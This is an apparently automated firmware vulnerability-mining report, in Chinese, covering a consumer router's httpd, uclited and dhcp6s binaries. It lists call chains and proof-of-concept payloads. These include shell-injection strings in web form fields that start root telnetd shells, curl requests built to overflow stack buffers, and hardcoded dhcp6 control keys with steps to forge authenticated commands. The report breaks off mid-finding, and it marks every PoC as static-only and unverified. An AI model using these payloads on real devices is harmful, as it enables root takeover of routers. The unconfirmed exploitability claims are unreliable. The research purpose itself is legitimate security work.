# 漏洞挖掘报告

## 一、任务信息

- 会话：s-mt4rda4n-55d3
- 任务：沿高分攻击路径做动静结合挖掘，给出调用链和可复现 PoC。优先命令注入和内存破坏。上一轮已入库 F-mt4ljkg4-bede（bpalogin 栈溢出，static-only）。请继续挖 httpd/minidlna/dhcp6s 等，必须自己调用 fw_request_trace/fw_get_trace 和 fw_request_fuzz/fw_get_fuzz_run：fuzz 若 status=running 就继续轮询直到 ok/error（120s 跑不是卡死）；函数级 handshake 失败就改整二进制（只传 binary_md5）。record_finding 必须带 call_chain 和 poc。
- 引擎：dsh（模式：dynamic）
- 固件任务：3a1f3c822c22
- 报告时间：2026-08-23T08:16:44Z

## 二、发现统计

- 共 15 个漏洞：高危 8 个，中危 6 个，低危 1 个

## 三、漏洞详情

### 漏洞 1：httpd/uclited NAS Samba 用户配置 smbpasswd 命令注入（NAS 账号密码无过滤拼入 system）（F-mt4rye54-c344）

- **漏洞类型**：command-injection（CWE-78）
- **危害等级**：高危（置信度 0.55）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：nasSambaSetUserList @ 0x5471d0
- **可达性**：static-only
- **漏洞描述**：httpd（0x5471d0）与 uclited（0x4a4b48）的 NAS Samba 用户配置应用函数把配置结构 a1 中的 NAS 账号名（a1[44*i+2]）与密码（a1[44*i+6]）直接拼进 execFormatCmd("%s -p %s -a %s","smbpasswd",pwd,user)。execFormatCmd（httpd 0x5308cc / uclited 0x411658）= vsprintf(s[260]) + system(s)。账号或密码含 shell 元字符（; $() 反引号）即命令注入，以 httpd/uclited 的 root 权限执行；输入超过 255 字符还会造成 vsprintf 栈溢出。字段值来自认证后 Web 的 NAS 共享用户/密码配置（页面 /userRpm/NasFolderSharingRpm.htm 等），无白名单或转义过滤。
- **漏洞证据**：
  1. httpd nasSambaSetUserList 0x5471d0: execFormatCmd("%s -p %s -a %s", "smbpasswd", (const char *)&a1[44*v5+6], v7=myStrlwr(&a1[44*v5+2]))（多用户循环，-p 为密码字段）
  2. uclited nasSambaSetUserList 0x4a4b48 同构: execFormatCmd("%s -p %s -a %s", "smbpasswd", v1=&a1[44*a1[1]+6], v2)
  3. execFormatCmd httpd 0x5308cc: vsprintf(s[260], format, arg) 无长度限制；callees 显示调用 tp_systemEx
  4. uclited execFormatCmd 0x411658: vsprintf(s[260]) + sub_41153C(system)
  5. fopen "/tmp/passwd""/tmp/samba/private/smbpasswd" 写入的账号来源于同一配置结构 a1，且 myStrlwr 仅做小写转换不过滤
  6. httpd checksec: canary=false nx=false pie=false relro=none

**调用链**：

管理员登录 http://<router>/userRpm/NasFolderSharingRpm.htm（NAS 用户配置, HttpAccessPermit 通过） → httpd 解析共享用户/密码进入 NAS 配置结构 a1 → httpd nasSambaSetUserList(0x5471d0)（或经 ucm 回环 IPC 127.0.0.1:51237 → uclited nasSambaSetUserList 0x4a4b48） → execFormatCmd(0x5308cc/0x411658)("%s -p %s -a %s","smbpasswd", password@a1[44i+6], username@a1[44i+2]) → vsprintf(s[260]) → system(s)（root）

**漏洞 PoC**：

```
1) 浏览器登录 admin（默认 admin/admin）后访问 NAS 用户设置页；2) 新建/修改 Samba 共享账号，用户名字段填：x;busybox telnetd -l /bin/sh;#（或密码字段填：p$(id>/tmp/pwn).x）；3) 保存触发 httpd nasSambaSetUserList：执行 system("smbpasswd -p <pwd> -a x;busybox telnetd -l /bin/sh;# ...")，23 端口出现 root shell；或把密码填 300 个 A 触发 vsprintf 栈溢出（CANARY/NX 均关闭的 MIPS 构建可直接 RCE）。静态分析，未做动态复核。
```


### 漏洞 2：uclited 访问控制 URL/域名规则注入 accessCtrl.sh 脚本命令执行（CWE-78）（F-mt4uxlus-6633）

- **漏洞类型**：command-injection（CWE-78）
- **危害等级**：高危（置信度 0.55）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/uclited（md5: d61e67ed20163b7fee8bd3c606fb0331）
- **漏洞位置**：sub_42E490 @ 0x42e490
- **可达性**：static-only
- **漏洞描述**：uclited 访问控制（ACL，URL/域名过滤）应用链：refreshAccessCtrlTbl(0x42f5f0) 以 fopen("/tmp/wr841n/accessCtrl.sh","wt") 写 shell 脚本后执行 system("sh /tmp/wr841n/accessCtrl.sh")；其中 sub_42E490(0x42e490) 把每条 ACL 规则生成 iptables 行 fprintf 进该脚本。规则中的 URL 列表字段（v25，来自条目 v38[31*i]，4×31B 的 URL/关键字段）经 sprintf("-p tcp --dport 80 -m multiurl --urls %s ", v25) 原样写入；DNS 域名字段（v24 仅做 . 与大写转换，; $ ` 等原样保留）经 sprintf("-p udp --dport 53 -m string --string %s ...", v25) 写入——均无 shell 元字符过滤。ACL 规则条目中的 URL 或域名含 ; / $(...) / 反引号 即注入 accessCtrl.sh，由 system 以 root 执行（sh 解析）。触发面：/userRpm/AccessCtrlRpm.htm 保存 ACL（认证后）→ ucm 回环 IPC → ucFilterSave(0x4c2a0c, a1==3) → refreshAccessCtrlTbl → sub_42E490。
- **漏洞证据**：
  1. uclited refreshAccessCtrlTbl 0x42f5f0: filterScriptFile=fopen("/tmp/wr841n/accessCtrl.sh","wt"); ...系统调 fclose 后 system("sh /tmp/wr841n/accessCtrl.sh")
  2. uclited sub_42E490 0x42e490: 对每条规则配置 v38[31*i]（URL/关键字, 31B/个）: for(i<4){ if(v38[31*i]) sprintf(&v25[...],"%s,",&v38[31*i]); } → sprintf(dest,"-p tcp --dport 80 -m multiurl --urls %s ", v25) 原样入脚本，无转义
  3. 同函数 DNS 分支: v24 仅做 '.'→计数替换、大写转小写（; $ ` 反引号不被触碰）→ sprintf(dest,"-p udp --dport 53 -m string --string %s ...", v25) → fprintf(filterScriptFile)
  4. ucFilterSave 0x4c2a0c: if(a1==3) refreshAccessCtrlTbl(ucAccessCtrlRulesTable) —— a1==3 为 URL/域名过滤模式
  5. uclited checksec 同族无 canary（httpd/dhcp6s 全部 canary=false）
  6. 其余 v19 拼接字段（swIpAddr2Str/协议白名单/端口数值）均安全，危险面为 URL 与域名两处字符串

**调用链**：

/userRpm/AccessCtrlRpm.htm（admin, 保存 URL/域名过滤规则, url=…含 ;） → httpd → ucm 回环 IPC(127.0.0.1:51237) → uclited ucFilterSave(0x4c2a0c) → refreshAccessCtrlTbl(0x42f5f0) → fopen(\"/tmp/wr841n/accessCtrl.sh\",\"wt\") → sub_42E490(0x42e490) → sprintf(\"-m multiurl --urls %s\", URL…) / sprintf(\"-m string --string %s\", 域名…) 原样 fprintf 进脚本 → system(\"sh /tmp/wr841n/accessCtrl.sh\")（root）

**漏洞 PoC**：

```
1) 管理员登录 → 访问控制/URL 过滤页；2) 新增规则，URL 字段填：x;telnetd -l /bin/sh;#（或域名字段 y$(id>/tmp/pwn).com）；3) 保存并启用过滤：uclited 生成 /tmp/wr841n/accessCtrl.sh 含 "iptables ... -m multiurl --urls x;telnetd -l /bin/sh;# ..."，system("sh /tmp/wr841n/accessCtrl.sh") 解析 `;` 后段 → 23 端口 root shell。静态分析，未动态复核。
```


### 漏洞 3：uclited 家长控制 URL/域名字段无转义注入 parent.sh 脚本命令执行（CWE-78）（F-mt5ca8ih-a62e）

- **漏洞类型**：command-injection（CWE-78）
- **危害等级**：高危（置信度 0.55）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/uclited（md5: d61e67ed20163b7fee8bd3c606fb0331）
- **漏洞位置**：refreshParentCtrlTbl @ 0x4304d4
- **可达性**：static-only
- **漏洞描述**：uclited 家长控制应用链（与访问控制 F-mt4uxlus-6633 双二进制同族之姊妹链）：refreshParentCtrlTbl(0x4304d4) fopen("/tmp/wr841n/parent.sh","wt") 写 iptables 脚本后 system("sh /tmp/wr841n/parent.sh")；sub_42FB70(0x42fb70) 生成每条家长控制规则的 iptables 行 fprintf 进脚本。规则条目（a2+4+280i，280B/条）包含 8×31B 的 URL/关键字字段（a1+31+31i）与域名字段。URL 汇聚至 v22 后经 sprintf("-m multiurl --urls %s -j RETURN", v22) 原样写入；域名经 v24/v23 处理（仅 . 与大写转小写，; 与 $( 反引号 原样保留）后经 sprintf("-m string --string %s ...", v23) 写入——均无 shell 元字符过滤，随后 fprintf(parentCtrlScript)。家长控制条目中的 URL/域名含 ; / $(...) / 反引号 即注入 parent.sh，由 system 以 root 执行（sh 解析）。触发面：家长控制（ParentCtrl）页面保存规则（认证后）→ ucm 回环 IPC → ucFilterSave/refreshParentCtrlTbl。httpd 侧同构（0x4a9998 refreshParentCtrlTbl + sub_4A9410）双二进制并存。
- **漏洞证据**：
  1. uclited refreshParentCtrlTbl 0x4304d4: parentCtrlScript=fopen("/tmp/wr841n/parent.sh","wt"); ... fclose 后 system("sh /tmp/wr841n/parent.sh")
  2. uclited sub_42FB70 0x42fb70: 对 8×31B URL 字段(a1+31+31i): for(i<8){if(*...31i) sprintf(&v22[strlen],"%s,",a1+31+31i);} → sprintf(v18, "-i %s -m multiurl --urls %s -j RETURN", …, v22) 原样入脚本，无转义
  3. 同函数域名: v24 仅 .→计数、大写转小写（; $ 反引号不被触碰）→ sprintf("-i %s -p udp --dport 53 -m string --string %s ...", …, v23) → fprintf(parentCtrlScript)
  4. 条目来源 httpd 家长控制页保存（认证后）→ ucm → 与 ACL ucFilterSave 同族触发路径
  5. httpd 侧同构: refreshParentCtrlTbl(0x4a9998) + sub_4A9410（双二进制）
  6. libipt_multiurl/libxt_string（fw_list_binaries）内核匹配器可用，命令形态真实

**调用链**：

家长控制页（admin, 保存 URL/域名规则, url=…含 ;） → httpd → ucm 回环 IPC(127.0.0.1:51237) → uclited refreshParentCtrlTbl(0x4304d4) → fopen(\"/tmp/wr841n/parent.sh\",\"wt\") → sub_42FB70(0x42fb70) → sprintf(\"-m multiurl --urls %s\", URL…) / sprintf(\"-m string --string %s\", 域名…) 原样 fprintf 进脚本 → system(\"sh /tmp/wr841n/parent.sh\")（root）

**漏洞 PoC**：

```
1) 管理员登录 → 家长控制/网站关键字规则页；2) 新增规则，网站/关键字字段填：x;telnetd -l /bin/sh;#；3) 保存并启用：uclited 生成 /tmp/wr841n/parent.sh 含 "iptables ... -m multiurl --urls x;telnetd -l /bin/sh;#,..." → system("sh /tmp/wr841n/parent.sh") 解析 ; 后段 → root shell。静态分析，未动态复核。
```


### 漏洞 4：uclited nasSambaSetShareList 共享名拼接 rm -rf 命令注入（CWE-78）（F-mt4rzh23-e931）

- **漏洞类型**：command-injection（CWE-78）
- **危害等级**：高危（置信度 0.5）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/uclited（md5: d61e67ed20163b7fee8bd3c606fb0331）
- **漏洞位置**：nasSambaSetShareList @ 0x4a63ec
- **可达性**：static-only
- **漏洞描述**：uclited nasSambaSetShareList（0x4a63ec）在应用 Samba 共享配置时（服务类型 a1+68 != 0 分支），将配置结构中的共享名（a1+80 或 a1+256，按 a1+76 选择）直接拼进 snprintf(v6[128], \"rm -rf /tmp/samba/%s.smb.conf\", name) 后 system(v6)。共享名来源于认证后 Web 的 NAS 文件夹共享页（/userRpm/NasFolderSharingRpm.htm 等）下发的 ucm 配置（回环 IPC 127.0.0.1:51237），无 shell 元字符过滤。共享名含 ; 或 $(...) 即 root 命令注入；snprintf 长度受限于 0x7F（127 字节），在限长内即可注入。仅 snprintf 限制命令总长，不构成过滤。
- **漏洞证据**：
  1. uclited nasSambaSetShareList 0x4a63ec: v2=*(a1+76); snprintf(v6,0x80,"rm -rf /tmp/samba/%s.smb.conf", (a1+80) 或 (a1+256)); system(v6); 仅在 *(a1+68)==1||2 分支
  2. 同函数 0x4a63ec:43 另通过 sprintf(v5, off_53F494, name, "/tmp/usbdisk/", name) 写 smb.conf（共享名含 \n 可注入 smb.conf 指令）
  3. callers: uclited 内 6 处调用（nasSambaStop/Start 及配置应用链），httpd 同构写配置函数 0x5463e0 仅写文件无 system，system 在 uclited 侧
  4. 共享名结构字段 a1+80/a1+256 与 smb.conf 输出的同名共享名一致

**调用链**：

管理员认证 POST NAS 共享配置页（设置/删除共享文件夹,samba 开启） → httpd NAS 配置处理 → ucm 协议 IPC（127.0.0.1:51237 TCP） → uclited ucm_msgTaskCreate(0x41f3fc) recv/分帧 → ucm_cfg_handler → nasSambaSetShareList(0x4a63ec) → snprintf(v6[128],\"rm -rf /tmp/samba/%s.smb.conf\", shareName@a1+80/a1+256) → system(v6)（root）

**漏洞 PoC**：

```
管理员登录后：1) 启用 Samba 服务并新建共享文件夹；2) 共享名字段填：x;telnetd -l /bin/sh;.smb.conf（≤127 字节）；3) 保存。uclited 执行 system(\"rm -rf /tmp/samba/x;telnetd -l /bin/sh;.smb.conf.smb.conf\") → 23 端口 root shell。静态分析，未动态复核。
```


### 漏洞 5：uclited PPPoE AC/Service 名未转义拼入 pppd 拨号命令 system() 执行（CWE-78 命令注入）（F-mt4ubzd8-c199）

- **漏洞类型**：command-injection（CWE-78）
- **危害等级**：高危（置信度 0.5）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/uclited（md5: d61e67ed20163b7fee8bd3c606fb0331）
- **漏洞位置**：pppoeFormatCmd @ 0x448d14
- **可达性**：static-only
- **漏洞描述**：uclited PPPoE 拨号命令构造器 pppoeFormatCmd（0x448d14）将 PPPoE 配置中的 AC 名（a1+544，对应 Web 端 rp_pppoe_ac/PPPoE 服务商名）与服务名（a1+512，rp_pppoe_service）以 sprintf 原样拼入全局命令缓冲 a2（byte_5448E4，"pppd pppoe rp_pppoe_ac %s rp_pppoe_service %s ..."），随后由 pppoeCmdReqIPv4（0x4488f4）执行 system(a2)。两个字符串字段来自 /userRpm/PPPoECfgAdvRpm.htm（认证后 WAN PPPoE 高级设置），无 shell 元字符过滤（仅首字节状态标记控制是否输出）；AC/服务名含 ; 或 $() 即 root 命令注入。PPPoE 用户名/密码本身写入 /tmp/pppoe_auth_info_ipv4 供 pppd 读取（不经 shell），故注入点在 AC/Service 名。
- **漏洞证据**：
  1. uclited pppoeFormatCmd 0x448d14: if(*(a1+544)){ v2=strlen(a2); sprintf(&a2[v2]," rp_pppoe_ac %s ",(char*)(a1+544));} —— AC 名无过滤直接入命令
  2. 同函数: if(*(a1+512)){ sprintf(&a2[strlen(a2)]," rp_pppoe_service %s ",(char*)(a1+512));}
  3. pppoeCmdReqIPv4 0x4488f4: pppoeFormatCmd((int)v5, byte_5448E4); system(byte_5448E4);（v5=swGetPppoeCfg 配置结构）
  4. 用户名/密码写入 /tmp/pppoe_auth_info_ipv4（fwrite v20/v21），命令里只有 user_len/passwd_len —— 注入面确为 AC/Service 字符串
  5. pppoeCmdReq 0x4484d0 拨号触发链（gPppoeStartDial=1 后进入拨号）

**调用链**：

/userRpm/PPPoECfgAdvRpm.htm（管理员认证，设置 PPPoE AC/Service 名） → httpd PPPoE 配置 → ucm 回环 IPC(127.0.0.1:51237) → uclited 配置存储(swSetPppoeCfg/swGetPppoeCfg) → pppoeCmdReq(0x4484d0)/pppoeCmdReqIPv4(0x4488f4)（拨号触发，gPppoeStartDial） → pppoeFormatCmd(0x448d14)（sprintf "rp_pppoe_ac %s"/"rp_pppoe_service %s" 未转义拼入 byte_5448E4） → system(byte_5448E4)（root）

**漏洞 PoC**：

```
1) 管理员登录 → WAN 连接类型 PPPoE；2) 高级设置中 AC 名称（rp_pppoe_ac）填：x;telnetd -l /bin/sh;（或服务名 rp_pppoe_service 填 $(id>/tmp/pwn).x）；3) 保存并触发重新拨号（手动连接/重拨）：uclited 执行 system("pppd pppoe rp_pppoe_ac x;telnetd -l /bin/sh; ...") → 23 端口 root shell。静态分析，未动态复核。
```


### 漏洞 6：httpd NAS 共享文件夹 displayName 参数无界 strcpy 栈缓冲区溢出（CWE-121）（F-mt4s9d9c-dcd3）

- **漏洞类型**：stack-overflow（CWE-121）
- **危害等级**：高危（置信度 0.45）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：sub_49D184 @ 0x49d184
- **可达性**：static-only
- **漏洞描述**：httpd /userRpm/NasFolderSharingRpm.htm 处理器 sub_49D184 在处理 POST 参数 subpage 分支时，把 displayName 参数用 strcpy(v75, v18) 拷入仅 4 字节的栈变量 v75（sp+0x2C，其后紧跟 v76..v79、src[36] 等局部），随后再次 strcpy(&s[77*v1+262], v75) 拷入 7796 字节的栈数组 s（s[1949] dword），两次均无长度检查。displayName 长度无任何校验（重复检查仅 strncmp 前 16 字节），正常 UI 输入（如 20 字符的显示名）即越界；攻击者可提交数千字节 displayName 覆盖栈上 s[] 直到底部保存寄存器/返回地址。httpd 编译无栈保护（canary=false, nx=false, pie=false），溢出可致 DoS 或 ROP/代码执行。
- **漏洞证据**：
  1. httpd sub_49D184 0x49d184: v18=httpGetEnv(a1,"displayName"); strcpy(v75, v18); 声明 char v75[4] [sp+2Ch]
  2. 同函数: strcpy((char *)&s[77*v1+262], v75); s 为 _DWORD s[1949] 栈数组（7796 字节, [sp+232Ch]），偏移 77*v1+262 处为共享显示名字段，后随 256 字节文件夹名字段(+270)，无界 strcpy 可跨条目溢出
  3. 重复检查仅 strncmp(&s[v21+262], v19, 0x10u) 与 strncmp(&s[v21+270], v19, 0x100u)，无长度限制
  4. httpd checksec: canary=false nx=false pie=false relro=none（trace 70f79dca3ee7 官方输出）

**调用链**：

POST /userRpm/NasFolderSharingRpm.htm（admin 会话, subpage=xxx&displayName=<超长>） → httpDispatcher(0x425d08) 匹配 RPM → sub_425CB8 鉴权通过 → sub_49D184(0x49d184) → 分支 httpGetEnv("subpage") 非空 → httpGetEnv("displayName") → strcpy(v75[4], displayName)（sp+0x2C 起无界覆盖 v76/v77/v78/v79/src）→ strcpy(&s[77*shareIndex+262], v75)（栈数组 s[1949]dword 的固定偏移无界覆盖）→ 栈溢出（无 canary）

**漏洞 PoC**：

```
1) 浏览器/curl 登录（默认 admin/admin）：curl -b cookies 'http://192.168.1.1/userRpm/NasFolderSharingRpm.htm?Save=Save' 先建会话；2) POST：curl -b cookies -d 'subpage=add&displayName=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA（>500 个 A）&shareFolderName=/tmp/usbdisk/volume1' 'http://192.168.1.1/userRpm/NasFolderSharingRpm.htm'；3) httpd 崩溃（RST/watchdog 重启）或 ROP（配合无 NX 执行 shellcode）。静态分析，未动态复核。
```


### 漏洞 7：httpd popupSiteSurvey ssid 参数无界 strncpy 栈溢出（CWE-121，68B 即可触发）（F-mt4uoy71-f5d5）

- **漏洞类型**：stack-overflow（CWE-121）
- **危害等级**：高危（置信度 0.45）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：sub_469310 @ 0x469310
- **可达性**：static-only
- **漏洞描述**：httpd /userRpm/popupSiteSurveyRpm.htm 处理器 sub_469310（0x469310）在无线站点扫描结果渲染段读取 POST/GET 参数 ssid：v23=strlen(Env); strncpy(v51, v22, v23) —— 栈上局部 v51 声明为 char[68]（sp+0xB0），拷贝长度原样取输入长度且无任何校验（对比同族保存路径 sub_46794C 对 ssid 有 strlen>=0x21 拒绝、WlanNetworkRpm 渲染路径（已入库 F-mt4umrtg-9528）为 BSS 全局；本处为 STACK 局部）。直接 POST ssid≥68 字符即溢出 v51，覆盖紧随的 v52[22]（pagePara 描述数组）与更上层局部直至保存寄存器/返回地址；httpd 无栈保护（canary=false,nx=false,pie=false），可 ROP/代码执行。触发阈值低（68B），无需绕过 JS（直接 curl POST）。
- **漏洞证据**：
  1. httpd sub_469310 0x469310: if(Env=httpGetEnv(a1,"ssid")){ v23=strlen(Env); strncpy(v51, v22, v23); } —— 无长度上限
  2. v51 声明 char v51[68] [sp+B0h]；紧随 char v52[...] 为 pagePara 数组（v52[0..17]），再上层为 s[2948] 扫描缓冲与保存寄存器区
  3. 对比：保存路径 sub_46794C 对 ssid0..N 均有 strlen>=0x21 拒绝 + strncpy 0x20；本函数为扫描渲染路径，缺失该检查
  4. httpd checksec: canary=false nx=false pie=false relro=none（trace 70f79dca3ee7 官方输出）
  5. 同函数其余字段（curRegion/channel/chanWidth/mode）均 atoi 后范围校验，仅 ssid 字符串无界

**调用链**：

POST/GET /userRpm/popupSiteSurveyRpm.htm（admin 会话, ssid=AAAA...(≥68B)） → httpDispatcher(0x425d08) → sub_469310(0x469310) → httpGetEnv(\"ssid\") → strncpy(v51[68], ssid, strlen(ssid))（无界） → 栈溢出（无 canary）

**漏洞 PoC**：

```
curl -b cookies 'http://192.168.1.1/userRpm/popupSiteSurveyRpm.htm?ssid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA（≥68 个 A）' —— httpd 在站点扫描页渲染时 strncpy 按 strlen 整段拷入 68B 栈缓冲，覆盖 v52 数组与保存 $ra，崩溃或 ROP（MIPS 无 NX）。静态分析，未动态复核。
```


### 漏洞 8：httpd b64_decode 无 dst 边界 + ChangeLoginPwdRpm 超长口令 base64 驱动栈溢出（CWE-121）（F-mt4vcmal-c55a）

- **漏洞类型**：stack-overflow（CWE-121）
- **危害等级**：高危（置信度 0.45）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：b64_decode @ 0x52f4bc
- **可达性**：static-only
- **漏洞描述**：httpd 的 base64 解码器 b64_decode（0x52f4bc）对 a2(dstlen) 仅在入口 _assert("dst != NULL && dstlen > 0") 检查，主解码循环（每 4 输入字节写 3 输出字节）仅以输入长度 v11 为界、完全不做 dst 空间上限判断。调用方 sub_47DBF0（/userRpm/ChangeLoginPwdRpm.htm 修改管理员密码页）将 POST 参数 oldpassword/newpassword/newpassword3 的原始长度分别喂给 b64_decode(&v32[16],32,oldpwd)、b64_decode(&v32[65],32,newpwd)、b64_decode(src,32,newpwd3)，输入无长度限制：v32 为 100 字节栈缓冲（sp+0xDC，16=offset16 起 84B 可用；65 起仅 35B 可用），src 为 36 字节栈缓冲。newpassword base64 输入 ≥60 字符（约 45B 明文）即解码输出 ≥45B 越过 v32[65] 的 35B 可用区，无需登录即可在已认证会话下（任何持管理员凭据者）触发 v32/src 栈溢出，覆盖栈上更高局部与保存寄存器区；httpd 无 canary/nx。同页面后续还把新用户名/密码写入 NAS 用户配置（进 smbpasswd execFormatCmd 注入链 F-mt4rye54-c344 的又一条入口）。
- **漏洞证据**：
  1. httpd b64_decode 0x52f4bc: 入口 _assert("dst != ((void *)0) && dstlen > 0", "base64.c", 65) 后主循环 while(v11>0){ *v16=...; v16[1]=...; v16[2]=...; v11-=4; v13+=4; v16+=3; } —— 无 a2/dst 空间检查
  2. 调用方 sub_47DBF0 0x47dbf0: b64_decode(&v32[16], 32, oldpassword, strlen) / b64_decode(&v32[65], 32, newpassword, strlen) / b64_decode(src, 32, newpassword3, strlen)——v32 声明 char v32[100] [sp+DCh]，src char[36] [sp+54h]
  3. v32[65] 偏移 65 起可用仅 35B；输入 newpassword 无长度限制（httpGetEnv 全量）
  4. httpd checksec: canary=false nx=false pie=false relro=none（trace 70f79dca3ee7 官方输出）
  5. 页面后续 swNasSetSrvUserList(s)：strncpy(&s[20], 新用户名,0x10); strncpy(&s[24], src,0x10); strncpy(&s[28], &v32[65],0x21) → NAS smbpasswd 注入链的又一入口

**调用链**：

POST /userRpm/ChangeLoginPwdRpm.htm（admin 会话, Save=1&newpassword=<≥60 字符 base64>） → httpDispatcher(0x425d08) → sub_47DBF0(0x47dbf0) → b64_decode(&v32[65], 32, newpassword, strlen)（0x52f4bc，dstlen 仅 _assert、循环无界） → 解码写越 v32[100] 栈缓冲 → 栈溢出（无 canary）→ 可 ROP；且新用户名/密码 → swNasSetSrvUserList → nasSetSrvUserList → nasSambaSetUserList → execFormatCmd(smbpasswd)（既有注入家族入口）

**漏洞 PoC**：

```
登录后：curl -b cookies -d 'Save=1&newpassword=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ=='（60 个 base64 字符，解码 45B）' http://192.168.1.1/userRpm/ChangeLoginPwdRpm.htm —— b64_decode 向 v32[65] 写入 45B（可用 35B）越过 100B 栈缓冲上溢至返回地址/保存寄存器区；配合无 NX/canary（MIPS be）可 ROP 提权。静态分析，未动态复核。
```


### 漏洞 9：dhcp6s/dhcp6c 控制通道使用固件内置静态 HMAC-MD5 密钥（硬编码凭据，CWE-798）（F-mt4so9az-7095）

- **漏洞类型**：hardcoded-credentials（CWE-798）
- **危害等级**：中危（置信度 0.55）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/sbin/dhcp6s（md5: 23e3796091277a8be1e69dc8f5093dbd）
- **漏洞位置**：main @ 0x407ff8
- **可达性**：static-only
- **漏洞描述**：dhcp6s（md5 23e37960）与 dhcp6c（md5 ae35a53c）的控制通道（TCP，默认 5470；main 中 dhcp6_ctl_init(0,NULL,ctlport,5) 经 getaddrinfo(0,"5470",AI_PASSIVE) bind 任意地址 + listen，随后 dhcp6_ctl_acceptcommand/dhcp6_ctl_readcommand 处理）启用控制消息认证，其 128-bit HMAC-MD5 密钥来自固件内置静态文件 /etc/dhcp6sctlkey（base64：Sw5jBn8OG8N5qn5vCMicmw==）与 /etc/dhcp6cctlkey（mHg8J6R+u5/YEHxjw21FKg==）。密钥对所有同型号设备完全相同且刻在固件里，任何提取固件（含镜像公开分发）的攻击者都能对暴露的 5470/tcp 控制通道构造合法 HMAC 控制报文（reconfigure/info 类命令），绕过 dhcp6_verify_mac 认证实现重配置/探测/DoS；密钥无 per-device 随机化、无轮换。
- **漏洞证据**：
  1. /etc/dhcp6sctlkey 内容=Sw5jBn8OG8N5qn5vCMicmw==（25 字节，base64 16 字节密钥）
  2. /etc/dhcp6cctlkey 内容=mHg8J6R+u5/YEHxjw21FKg==
  3. dhcp6s main 0x407ff8: dhcp6_ctl_authinit(off_43C07C[0]=-k 密钥文件, &dword_43C608, &dword_43DE94)；if(dword_43C608) dhcp6_ctl_init(off_43C070=NULL, off_43C074=ctlport, 5, &dword_43C060)；dhcp6_ctl_init 0x418a80 getaddrinfo(name,service) 后 socket/bind/listen
  4. dhcp6s main 循环: dhcp6_ctl_acceptcommand(dword_43C060, sub_404BE0) + dhcp6_ctl_readcommand，sub_404BE0 内 dhcp6_verify_mac
  5. 固件集中分发：密钥内嵌 squashfs，非出厂随机，所有 C7v2 设备相同

**调用链**：

网络攻击者(持固件静态密钥) → dhcp6s/dhcp6c 控制通道 listen(TCP 0.0.0.0:5470, dhcp6_ctl_init 0x418a80/0x418580, AI_PASSIVE) → dhcp6_ctl_acceptcommand(0x418504/0x418004) + dhcp6_ctl_readcommand(0x4182b8/0x417db8) → dhcp6_verify_mac（密钥= /etc/dhcp6sctlkey / /etc/dhcp6cctlkey 静态 base64） → 命令处理(sub_404BE0/cfparse 等)

**漏洞 PoC**：

```
1) 从固件提取 /etc/dhcp6sctlkey（Sw5jBn8OG8N5qn5vCMicmw==，base64 解码得 16 字节密钥 K）；2) 向目标 5470/tcp 发送 dhcp6ctl 控制报文，载荷按 KAME dhcp6ctl 协议：type=cmd, id, authenticate 标志，HMAC-MD5(K, 报文) 计算并附加；3) 发送 reconfigure 命令触发服务端 cfparse 重新加载配置（或 info 查询状态）。若路由器以 WAN 侧暴露 5470（默认 bind 任意地址）或 LAN 同网段可达，持任意固件副本即可通过认证。
```


### 漏洞 10：uclited execWlanCmd 无线密钥引号包装循环 v21[132] 栈缓冲区溢出（无长度上限）（F-mt4rnw6r-6de7）

- **漏洞类型**：stack-overflow（CWE-121）
- **危害等级**：中危（置信度 0.5）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/uclited（md5: d61e67ed20163b7fee8bd3c606fb0331）
- **漏洞位置**：execWlanCmd @ 0x49c84c
- **可达性**：static-only
- **漏洞描述**：uclited 的 execWlanCmd（0x49c84c）在 case 15/21（无线密钥设置）中，对传入密钥串 a3 做单引号包裹时逐字符写入局部缓冲 v21[132]（sp+0x11C，每字符写 3 字节：引号+字符+引号），循环边界仅取决于 strlen(a3) 而无长度上限。WPA-PSK 合法口令最长为 63 字符，3×63=189 > 132，溢出 v21 达 57+ 字节，可覆盖同帧后续保存寄存器区，存在栈溢出/控制流劫持风险。case 7（SSID）有 v12<33 检查，但 case 15/21 缺失同样检查。对比同函数其他分支使用 sprintf(v19[128], ...) 均受 %s 展开影响，唯 case15/21 的 v21 包装循环不受控。输入经 uclited 回环 IPC（127.0.0.1:51237，ucm 协议，accept 强制校验回环地址）由 httpd 转发管理员认证的 WLAN 安全配置。
- **漏洞证据**：
  1. uclited execWlanCmd 0x49c84c: case15/21 循环 while(v11<v8){ v21[v10++]=39; v21[v10++]=v9[v11]; v21[v10]=39; } 无长度上限，v21 声明为 char v21[132]（sp+0x11C），输入 63 字符 → 189 字节写入
  2. case 7 有 if(v12<33) 检查，case 15/21 无同等检查
  3. uclited main 0x5009f0 → ucm_msgTaskCreate 0x41f3fc: socket/bind(127.0.0.1:51237)/listen/accept，accept 后 (sa_data[2]&0xFF000000)!=0x7F000000 则关闭连接，厂商内网 IPC
  4. 配置文件 etc/dhcp6sctlkey 等表明该固件 uclited/httpd 双进程架构与回环 IPC 为常态

**调用链**：

